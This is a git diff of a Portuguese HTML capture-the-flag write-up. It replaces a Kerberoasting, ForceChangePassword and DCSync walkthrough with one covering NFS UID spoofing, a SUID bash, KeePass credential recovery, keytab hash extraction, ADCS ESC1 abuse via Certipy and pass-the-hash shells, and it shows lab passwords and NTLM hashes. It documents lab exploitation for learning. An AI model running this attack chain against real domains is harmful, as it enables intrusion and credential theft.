+uid=902601108(peter.turner@hybrid.vl) gid=902600513(domain users@hybrid.vl)</code></pre>
+
+    <div class="callout-info">
+      <div class="cf-title">ℹ NFS UID Spoofing</div>
+      <p>O NFS controla acesso por UID, não por autenticação. Criando um usuário local no nosso host com o mesmo UID (<code>902601108</code>), assumimos a identidade do usuário ao acessar arquivos no compartilhamento.</p>
+    </div>
+
+    <p>Copiamos o bash para o compartilhamento NFS, criamos o usuário com o UID correto em nosso host e configuramos o SUID:</p>
+
+    <pre><span class="lang-label">bash — no alvo</span><code>$ cp /usr/bin/bash .</code></pre>
+
+    <pre><span class="lang-label">bash — no host de ataque</span><code>$ sudo useradd user -u 902601108
+$ sudo passwd user
+$ cp bash /tmp/
+$ rm bash
+$ cp /tmp/bash .
+$ chmod +xs bash</code></pre>
+
+    <figure><img src="imgs/2025-02-28_13-27.png" alt="bash SUID no compartilhamento NFS" /></figure>
+    <figure><img src="imgs/2025-02-28_13-37.png" alt="Acesso ao diretório do peter.turner via UID spoof" /></figure>
+
+    <p>Acesso ao usuário obtido. Adicionamos nossa chave pública no <code>~/.ssh/authorized_keys</code> para uma sessão SSH estável.</p>
 
     <div class="callout-flag">
       <div class="cf-title">🚩 Flag 1 — User Flag</div>
-      <p>Obtida via enumeração de usuários com <code>svc_backup</code></p>
+      <p>Obtida no diretório home de <code>peter.turner</code></p>
     </div>
 
-    <h2 id="kerberoast">Kerberoasting — svc_web</h2>
+    <figure><img src="imgs/2025-02-28_13-42.png" alt="Flag 1 obtida" /></figure>
 
-    <p>Executamos o ingestor do BloodHound para mapear o domínio e identificar caminhos de escalada.</p>
+    <h2 id="keepass">Escalada Vertical — KeePass</h2>
 
-    <pre><span class="lang-label">bash</span><code>$ bloodhound-python --zip -c All -d wcorp.hc \
-  -u 'svc_backup' -p 'LuvinJames&lt;3' \
-  -dc dc-01.wcorp.hc -ns 172.16.11.181
+    <p>No diretório do usuário encontramos um arquivo <code>passwords.kdbx</code>. Transferimos para nosso host e abrimos com <code>kpcli</code>, testando a credencial encontrada anteriormente:</p>
 
-INFO: Found 1 domains | Found 11 users | Found 53 groups
-INFO: Compressing output into 20250419205634_bloodhound.zip</code></pre>
+    <pre><span class="lang-label">bash</span><code>$ kpcli
+kpcli:/> open ./passwords.kdbx
+Provide the master password: *************************   (Duckling21)
 
-    <figure><img src="imgs/image 1.png" alt="BloodHound mostrando caminho de ataque" /></figure>
+kpcli:/> ls
+=== Groups ===
+eMail/
+Internet/
+hybrid.vl/
 
-    <p>O BloodHound revelou que seria necessário comprometer <code>svc_web</code>. Verificamos a existência de SPNs associados:</p>
+kpcli:/> cd hybrid.vl/
+kpcli:/hybrid.vl> show -f 0
 
-    <pre><span class="lang-label">bash</span><code>$ GetUserSPNs.py wcorp.hc/svc_backup:'LuvinJames&lt;3' -dc-ip 172.16.11.181
-
-ServicePrincipalName  Name     PasswordLastSet              LastLogon
---------------------  -------  ---------------------------  --------------------------
-HTTP/app01.wcorp.hc   svc_web  2025-04-17 03:55:21.770126  2025-04-19 18:20:46.842080</code></pre>
-
-    <p>SPN confirmado — executamos o Kerberoasting para obter o TGS:</p>
-
-    <pre><span class="lang-label">bash</span><code>$ GetUserSPNs.py wcorp.hc/svc_backup:'LuvinJames&lt;3' -dc-ip 172.16.11.181 -request
-
-$krb5tgs$23$*svc_web$WCORP.HC$wcorp.hc/svc_web*$928e2188409c8fe6d3ef600530ab7ed9$...</code></pre>
-
-    <pre><span class="lang-label">bash</span><code>$ john -w=/usr/share/wordlists/rockyou.txt hash-svc-web --format=krb5tgs
-
-J&J=1331ch       (?)
-1g 0:00:00:15 DONE (2025-04-19 21:12)</code></pre>
+Title: domain
+Uname: peter.turner
+ Pass: b0cwR+G4Dzl_rw</code></pre>
 
     <div class="callout-tip">
-      <div class="cf-title">✓ Credenciais Obtidas</div>
-      <p><code>svc_web</code> : <code>J&amp;J=1331ch</code></p>
+      <div class="cf-title">✓ Credenciais de Domínio</div>
+      <p><code>peter.turner</code> : <code>b0cwR+G4Dzl_rw</code></p>
     </div>
 
-    <h2 id="targeted">Targeted Kerberoasting — john.doe</h2>
+    <figure><img src="imgs/2025-02-28_13-43.png" alt="sudo -l com a senha do KeePass" /></figure>
 
-    <p>Nova análise no BloodHound com as credenciais de <code>svc_web</code> revelou permissão <strong>GenericWrite</strong> sobre o usuário <code>john.doe</code>.</p>
-
-    <figure><img src="imgs/image 2.png" alt="BloodHound mostrando GenericWrite de svc_web sobre john.doe" /></figure>
-
-    <div class="callout-info">
-      <div class="cf-title">ℹ GenericWrite → Targeted Kerberoasting</div>
-      <p>A permissão <code>GenericWrite</code> permite modificar atributos como <code>servicePrincipalName</code>. Adicionando um SPN falso ao objeto alvo, forçamos o KDC a emitir um TGS que pode ser quebrado offline.</p>
-    </div>
-
-    <pre><span class="lang-label">bash</span><code>$ python3 ~/tools/targetedKerberoast/targetedKerberoast.py \
-  -v -d 'wcorp.hc' -u 'svc_web' -p 'J&J=1331ch'
-
-[VERBOSE] SPN added successfully for (john.doe)
-[+] Printing hash for (john.doe)
-$krb5tgs$23$*john.doe$WCORP.HC$wcorp.hc/john.doe*$939e53611c683c816214a9c0ad74eaf8$...</code></pre>
-
-    <p>Link de referência: <a href="https://github.com/ShutdownRepo/targetedKerberoast" target="_blank">ShutdownRepo/targetedKerberoast</a></p>
-
-    <pre><span class="lang-label">bash</span><code>$ john -w=/opt/SecLists/Passwords/xato-net-10-million-passwords.txt \
-  hash-john --format=krb5tgs
-
-Welcome01!       (?)
-1g 0:00:00:03 DONE (2025-04-19 21:31)</code></pre>
-
-    <div class="callout-tip">
-      <div class="cf-title">✓ Credenciais Obtidas</div>
-      <p><code>john.doe</code> : <code>Welcome01!</code></p>
-    </div>
-
-    <h2 id="forcechange">ForceChangePassword — diana.ops</h2>
-
-    <p>Análise no BloodHound com as credenciais de <code>john.doe</code> revelou o privilégio <strong>ForceChangePassword</strong> sobre a conta <code>diana.ops</code>.</p>
-
-    <figure><img src="imgs/image 3.png" alt="BloodHound mostrando ForceChangePassword de john.doe sobre diana.ops" /></figure>
-
-    <div class="callout-info">
-      <div class="cf-title">ℹ ForceChangePassword</div>
-      <p>Permite alterar a senha de outro objeto no AD <strong>sem precisar conhecer a senha atual</strong>. Viabiliza movimentação lateral e escalada de privilégios.</p>
-    </div>
-
-    <pre><span class="lang-label">bash</span><code>$ net rpc password "diana.ops" "newP@ssword2025" \
-  -U "wcorp.dc"/"john.doe"%"Welcome01!" -S "172.16.11.181"</code></pre>
-
-    <p>Validando a troca de senha:</p>
-
-    <pre><span class="lang-label">bash</span><code>$ netexec smb 172.16.11.181 -u diana.ops -p 'newP@ssword2025'
-SMB  172.16.11.181  445  DC-01  [+] wcorp.hc\diana.ops:newP@ssword2025</code></pre>
-
-    <h2 id="dcsync">DCSync & Acesso ao Administrator</h2>
-
-    <p>Com a conta <code>diana.ops</code> comprometida e confirmada sua permissão <strong>DCSync</strong>, executamos o <code>secretsdump.py</code> para replicar as credenciais de todo o domínio.</p>
-
-    <figure><img src="imgs/image 4.png" alt="BloodHound mostrando DCSync de diana.ops" /></figure>
-
-    <pre><span class="lang-label">bash</span><code>$ secretsdump.py wcorp.hc/diana.ops:'newP@ssword2025'@172.16.11.181
-
-[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-[*] Using the DRSUAPI method to get NTDS.DIT secrets
-
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:bca93a964b13304c96a364e8d59ce3cb:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cc714fd2703f917adcfc0aa3555917a4:::
-wcorp.hc\john.doe:1103:::a59cc2e81b2835c6b402634e584a8edc:::
-wcorp.hc\svc_backup:1108:::22221aa9489a9fa9996434260acdb6be:::
-wcorp.hc\svc_web:1109:::232a3f9ae310b39473cd157a270d80d6:::
-[*] Kerberos keys grabbed
-Administrator:aes256-cts-hmac-sha1-96:8ee821d1e116cb434d87263887bdb5ed587572e904d2bf0d7da3b8d07c43927a
-[*] Cleaning up...</code></pre>
-
-    <div class="callout-info">
-      <div class="cf-title">ℹ DCSync</div>
-      <p>Simula o comportamento de um Domain Controller solicitando replicação de dados do AD via protocolo <code>MS-DRSR</code>, extraindo hashes NTLM e chaves Kerberos de todas as contas do domínio.</p>
-    </div>
-
-    <p>Com o hash NTLM do <code>Administrator</code> em mãos, estabelecemos sessão via WinRM usando Pass-the-Hash:</p>
-
-    <pre><span class="lang-label">bash</span><code>$ evil-winrm -i 172.16.11.181 -u Administrator \
-  -H bca93a964b13304c96a364e8d59ce3cb
-
-Evil-WinRM shell v3.5
-Info: Establishing connection to remote endpoint
-
-*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
-wcorp\administrator</code></pre>
-
-    <figure><img src="imgs/image 5.png" alt="Shell como Administrator via Evil-WinRM" /></figure>
+    <p>Executamos <code>sudo -l</code> com a senha obtida e conseguimos acesso root no mail01. Com isso, obtemos a segunda evidência.</p>
 
     <div class="callout-flag">
-      <div class="cf-title">🚩 Root Flag</div>
+      <div class="cf-title">🚩 Flag 2 — Root (mail01)</div>
+      <p>Obtida via <code>sudo su</code> com credenciais do KeePass</p>
+    </div>
+
+    <figure><img src="imgs/2025-02-28_13-54.png" alt="Root no mail01 e flag 2" /></figure>
+
+    <h3>Pivotando para o DC01</h3>
+    <p>As credenciais do KeePass também são válidas no domínio — testamos no DC01:</p>
+
+    <pre><span class="lang-label">bash</span><code>$ netexec smb 10.10.243.181 -u peter.turner -p 'b0cwR+G4Dzl_rw'
+SMB  10.10.243.181  445  DC01  [+] hybrid.vl\peter.turner:b0cwR+G4Dzl_rw</code></pre>
+
+    <figure><img src="imgs/2025-02-28_13-58.png" alt="Credenciais válidas no DC01" /></figure>
+
+    <h2 id="adcs">ADCS ESC1 via keytab MAIL01$</h2>
+
+    <p>Sem caminho direto para Domain Admin via BloodHound, enumeramos o ADCS:</p>
+
+    <pre><span class="lang-label">bash</span><code>$ netexec ldap 10.10.243.181 -u peter.turner -p b0cwR+G4Dzl_rw -M adcs
+ADCS  10.10.243.181  389  DC01  Found PKI Enrollment Server: dc01.hybrid.vl
+ADCS  10.10.243.181  389  DC01  Found CN: hybrid-DC01-CA</code></pre>
+
+    <pre><span class="lang-label">bash</span><code>$ certipy find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' \
+  -dc-ip 10.10.243.181 -vulnerable -stdout
+
+Certificate Templates
+  0
+    Template Name    : HybridComputers
+    Client Auth      : True
+    Enrollee Supplies Subject : True        ← ESC1!
+    Enrollment Rights: HYBRID.VL\Domain Computers
+    [!] Vulnerabilities
+      ESC1: 'HYBRID.VL\\Domain Computers' can enroll, enrollee supplies subject
+            and template allows client authentication</code></pre>
+
+    <figure><img src="imgs/2025-02-28_14-20.png" alt="Certipy identificando ESC1 no template HybridComputers" /></figure>
+
+    <div class="callout-info">
+      <div class="cf-title">ℹ ADCS ESC1</div>
+      <p>O template <code>HybridComputers</code> permite que <strong>Domain Computers</strong> se inscrevam e forneçam um Subject (UPN) arbitrário. Precisamos de uma conta de máquina para explorar isso.</p>
+    </div>
+
+    <h3>Extraindo credenciais da conta MAIL01$ via keytab</h3>
+    <p>Como root no mail01, acessamos o arquivo <code>/etc/krb5.keytab</code> que contém as credenciais Kerberos da conta de máquina:</p>
+
+    <pre><span class="lang-label">bash</span><code># python3 keytabextract.py /etc/krb5.keytab
+
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[+] Keytab File successfully imported.
+    REALM   : HYBRID.VL
+    SERVICE : MAIL01$/
+    NTLM HASH : 0f916c5246fdbc7ba95dcef4126d57bd
+    AES-256   : eac6b4f4639b96af4f6fc2368570cde71e9841f2b3e3402350d3b6272e436d6e</code></pre>
+
+    <p>Referência: <a href="https://github.com/sosdave/KeyTabExtract/blob/master/keytabextract.py" target="_blank">sosdave/KeyTabExtract</a></p>
+
+    <figure><img src="imgs/2025-02-28_14-41.png" alt="keytabextract.py extraindo NTLM hash da MAIL01$" /></figure>
+
+    <h3>Explorando ESC1 com Certipy</h3>
+    <p>Com o hash NTLM da conta de máquina <code>MAIL01$</code>, solicitamos um certificado para o usuário <code>administrator</code>:</p>
+
+    <pre><span class="lang-label">bash</span><code>$ certipy req -u 'MAIL01$' -hashes '0f916c5246fdbc7ba95dcef4126d57bd' \
+  -target '10.10.243.181' -template 'HybridComputers' \
+  -ca hybrid-DC01-CA -upn administrator -key-size 4096
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator'
+[*] Saved certificate and private key to 'administrator.pfx'</code></pre>
+
+    <figure><img src="imgs/2025-02-28_15-06.png" alt="Certificado gerado para administrator via ESC1" /></figure>
+
+    <h2 id="admin">Acesso ao Administrator</h2>
+
+    <p>Usamos o certificado gerado para obter o TGT e extrair o hash NTLM via PKINIT:</p>
+
+    <pre><span class="lang-label">bash</span><code>$ certipy auth -pfx 'administrator.pfx' -username 'administrator' \
+  -domain 'hybrid.vl' -dc-ip 10.10.243.181
+
+[*] Using principal: administrator@hybrid.vl
+[*] Got TGT
+[*] Got hash for 'administrator@hybrid.vl':
+    aad3b435b51404eeaad3b435b51404ee:60701e8543c9f6db1a2af3217386d3dc</code></pre>
+
+    <figure><img src="imgs/2025-02-28_15-09.png" alt="Hash NTLM do Administrator extraído via PKINIT" /></figure>
+
+    <pre><span class="lang-label">bash</span><code>$ evil-winrm -i 10.10.243.181 -u administrator \
+  -H 60701e8543c9f6db1a2af3217386d3dc
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+hybrid\administrator</code></pre>
+
+    <figure><img src="imgs/2025-02-28_15-10.png" alt="Shell como Administrator no DC01" /></figure>
+
+    <div class="callout-flag">
+      <div class="cf-title">🚩 Flag 3 — Administrator (DC01)</div>
       <p>Obtida em <code>C:\Users\Administrator\Desktop\root.txt</code></p>
     </div>
 
@@ -462,16 +516,10 @@ wcorp\administrator</code></pre>
 </div>
 
 <script>
-  document.addEventListener('mousemove', e => {
-    const x = (e.clientX / window.innerWidth - 0.5) * 14;
-    const y = (e.clientY / window.innerHeight - 0.5) * 14;
-    document.querySelector('.grid-bg').style.transform = `translate(${x}px, ${y}px)`;
-  });
-
-  // TOC highlight ativo
+  // TOC — highlight seção ativa
   const sections = document.querySelectorAll('.wu-content h2[id]');
   const tocLinks = document.querySelectorAll('.toc a');
-  const tocObserver = new IntersectionObserver(entries => {
+  const observer = new IntersectionObserver(entries => {
     entries.forEach(e => {
       if (e.isIntersecting) {
         tocLinks.forEach(l => l.classList.remove('active'));
@@ -480,7 +528,13 @@ wcorp\administrator</code></pre>
       }
     });
   }, { rootMargin: '-10% 0px -80% 0px' });
-  sections.forEach(s => tocObserver.observe(s));
+  sections.forEach(s => observer.observe(s));
+
+  document.addEventListener('mousemove', e => {
+    const x = (e.clientX / window.innerWidth - 0.5) * 14;
+    const y = (e.clientY / window.innerHeight - 0.5) * 14;
+    document.querySelector('.grid-bg').style.transform = `translate(${x}px, ${y}px)`;
+  });
 </script>
 </body>
 </html>
